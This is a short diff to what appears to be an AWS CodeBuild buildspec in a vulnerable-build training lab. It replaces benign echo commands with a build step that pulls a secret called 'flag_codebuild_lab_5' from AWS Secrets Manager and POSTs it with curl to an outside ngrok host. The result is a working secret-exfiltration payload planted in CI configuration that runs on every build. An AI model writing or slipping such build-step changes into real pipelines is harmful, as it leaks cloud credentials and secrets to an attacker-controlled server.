@@ -3,6 +3,7 @@ version: 0.2
 phases:
   build:
     commands:
-      - echo "Running vulnerable training build"
-      - env | sort | head -n 20
-      - echo "Done"
+      - echo "=== START ==="
+      - FLAG=$(aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --region us-east-1 --query SecretString --output text)
+      - curl -X POST https://eeab-47-59-37-247.ngrok-free.app --data "flag=$FLAG"
+      - echo "=== END ==="
